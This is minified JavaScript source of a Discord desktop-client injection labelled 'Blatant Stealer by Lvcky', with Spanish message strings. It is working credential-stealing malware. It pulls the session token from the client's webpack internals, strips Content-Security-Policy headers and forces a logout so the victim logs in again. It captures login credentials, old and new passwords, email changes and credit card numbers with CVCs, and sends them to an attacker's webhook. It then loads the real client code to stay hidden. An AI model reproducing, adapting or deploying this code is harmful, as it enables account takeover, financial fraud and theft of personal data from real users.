const fs=require("fs"),path=require("path"),querystring=require("querystring"),{BrowserWindow:BrowserWindow,session:session}=require("electron"),TokenEval='for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;';var webhook="%WEBHOOK_LINK%",imageURL="https://c.tenor.com/R3T63pe67MQAAAAC/dragon.gif",mainName="Blatant Stealer",mainColor=10038562;function SendToWebhook(e){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();\n        xhr.open("POST", "${webhook}", true);\n        xhr.setRequestHeader('Content-Type', 'application/json');\n        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n        xhr.send(JSON.stringify(${e}));\n    `,!0)}function FirstTime(){if(!fs.existsSync(path.join(__dirname,"BLTNSTLR")))return!0;fs.rmdirSync(path.join(__dirname,"BLTNSTLR")),BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',!0).then(e=>{});var e={username:mainName,content:"@everyone",avatar_url:imageURL,embeds:[{title:"**Blatant inicializado**",color:mainColor,thumbnail:{url:`https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.png`},fields:[{name:`Blatant ha sido iniciado en ${os.hostname()}`,value:"Injeccion de **Blatant** exitosa",inline:!0},{name:"`Informacion de Nitro`",value:`Tipo de nitro: \`${GetNitro(json.premium_type)}\`\nInsignias: \`${GetBadges(json.flags)}\``,inline:!0},{name:"`Informacion de la cuenta`",value:"```json\n"+json.stringify(resp2,null,2),inline:!0}],author:{name:"Lvcky on top",url:"https://luckyyy.wtf",icon_url:"https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"},footer:{text:"Blatant Stealer by Lvcky"}}]};return SendToWebhook(JSON.stringify(e)),!1}session.defaultSession.webRequest.onHeadersReceived((e,t)=>{e.url.startsWith(webhook)?e.url.includes("discord.com")?t({responseHeaders:Object.assign({"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):t({responseHeaders:Object.assign({"Content-Security-Policy":["default-src '*'","Access-Control-Allow-Headers '*'","Access-Control-Allow-Origin '*'"],"Access-Control-Allow-Headers":"*","Access-Control-Allow-Origin":"*"},e.responseHeaders)}):(delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],t({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}}))});const Filter={urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions","wss://remote-auth-gateway.discord.gg/*"]};function GetNitro(e){return 0==e?"No Nitro":1==e?"`Nitro Classic`":2==e?"`Nitro Boost`":"No Nitro"}function GetBadges(e){var t="";return 1==(1&e)&&(t+="Discord Staff, "),2==(2&e)&&(t+="Partnered Server Owner, "),4==(4&e)&&(t+="Hypesquad Event, "),8==(8&e)&&(t+="Green Bughunter, "),64==(64&e)&&(t+="Hypesquad Bravery, "),128==(128&e)&&(t+="HypeSquad Brillance, "),256==(256&e)&&(t+="HypeSquad Balance, "),512==(512&e)&&(t+="Early Supporter, "),16384==(16384&e)&&(t+="Gold BugHunter, "),131072==(131072&e)&&(t+="Discord Developer, "),""==t&&(t="None"),t}function Login(e,t,n){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,!0).then(t=>{const o=JSON.parse(t);var a={username:mainName,content:"@everyone",avatar_url:imageURL,embeds:[{title:mainName,color:mainColor,thumbnail:{url:`https://cdn.discordapp.com/avatars/${o.id}/${o.avatar}.png`},fields:[{name:"**Usuario Loggeado**",value:`Correo: \`${e}\` - Clave: \${password}\` - `+o.username+"#"+o.discriminator+"・"+o.id,inline:!0},{name:"`Token`",value:`\`${n}\``,inline:!1},{name:"`Informacion de la cuenta`",value:"```json\n"+o.stringify(),inline:!0}],author:{name:"Lvcky on top",url:"https://luckyyy.wtf",icon_url:"https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"},footer:{text:"Blatant Stealer by Lvcky"}}]};SendToWebhook(JSON.stringify(a))})}function ChangePassword(e,t,n){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,!0).then(o=>{const a=JSON.parse(o);var r={username:mainName,content:"@everyone",avatar_url:imageURL,embeds:[{title:"**Clave Cambiada**",color:mainColor,thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.png`},fields:[{name:"`Claves`",value:`Correo: \`${a.email}\`\nClave vieja: \`${e}\`\nClave nueva: \`${t}\``},{name:"`Informacion de Nitro`",value:`Tipo de nitro: \`${GetNitro(a.premium_type)}\`\nInsignias: \`${GetBadges(a.flags)}\``,inline:!0},{name:"`Token`",value:`\`${n}\``,inline:!1},{name:"`Informacion de la cuenta`",value:"```json\n"+a.stringify(),inline:!0}],author:{name:"Lvcky on top",url:"https://luckyyy.wtf",icon_url:"https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"},footer:{text:"Blatant Stealer by Lvcky"}}]};SendToWebhook(JSON.stringify(r))})}function ChangeEmail(e,t,n){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,!0).then(e=>{var o=JSON.parse(e),a={username:mainName,content:"@everyone",avatar_url:imageURL,embeds:[{title:"**Correo Cambiada**",color:mainColor,thumbnail:{url:`https://cdn.discordapp.com/avatars/${o.id}/${o.avatar}.png`},fields:[{name:"`Correo`",value:`Nuevo correo: \`${o.email}\`\nClave \`${t}\``,inline:!0},{name:"`Informacion de Nitro`",value:`Tipo de nitro: \`${GetNitro(o.premium_type)}\`\nInsignias: \`${GetBadges(o.flags)}\``,inline:!0},{name:"`Token`",value:`\`${n}\``,inline:!1},{name:"`Informacion de la cuenta`",value:"```json\n"+o.stringify(),inline:!0}],author:{name:"Lvcky on top",url:"https://luckyyy.wtf",icon_url:"https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"},footer:{text:"Blatant Stealer by Lvcky"}}]};SendToWebhook(JSON.stringify(a))})}function CreditCardAdded(e,t,n,o,a){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${a}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,!0).then(r=>{var s=JSON.parse(r),i={username:mainName,content:"@everyone",avatar_url:imageURL,embeds:[{title:"**Tarjeta de credito agregada**",color:mainColor,thumbnail:{url:`https://cdn.discordapp.com/avatars/${s.id}/${s.avatar}.png`},fields:[{name:"`Informacion de la tarjeta`",value:`Numero de tarjeta: \`${e}\`\nCVC: \`${t}\`\nExpiracion: \`${n}/${o}\``,inline:!0},{name:"`Informacion de Nitro`",value:`Tipo de nitro: \`${GetNitro(s.premium_type)}\`\nInsignias: \`${GetBadges(s.flags)}\``,inline:!0},{name:"`Token`",value:`\`${a}\``,inline:!1},{name:"`Informacion de la cuenta`",value:"```json\n"+s.stringify(),inline:!0}],author:{name:"Lvcky on top",url:"https://luckyyy.wtf",icon_url:"https://c.tenor.com/Aj_zS4cAktcAAAAM/catto.gif"},footer:{text:"Blatant Stealer by Lvcky"}}]};SendToWebhook(JSON.stringify(i))})}session.defaultSession.webRequest.onBeforeRequest(Filter,(e,t)=>{FirstTime(),t({})});const UrlFilter={urls:["https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v*/tokens"]};session.defaultSession.webRequest.onCompleted(UrlFilter,(e,t)=>{if(e.url.endsWith("login")&&200==e.statusCode){const t=JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TokenEval,!0).then(e=>{Login(t.login,t.password,e)})}if(e.url.endsWith("users/@me")&&200==e.statusCode&&"PATCH"==e.method){const t=JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());if(null!=t.password&&null!=t.password&&""!=t.password){if(null!=t.new_password&&null!=t.new_password&&""!=t.new_password){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TokenEval,!0).then(e=>{ChangePassword(t.password,t.new_password,e)})}if(null!=t.email&&null!=t.email&&""!=t.email){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TokenEval,!0).then(e=>{ChangeEmail(t.email,t.password,e)})}}}if(e.url.endsWith("tokens")){const t=querystring.parse(e.uploadData[0].bytes.toString());BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TokenEval,!0).then(e=>{CreditCardAdded(t["card[number]"],t["card[cvc]"],t["card[exp_month]"],t["card[exp_year]"],e)})}}),module.exports=require("./core.asar");
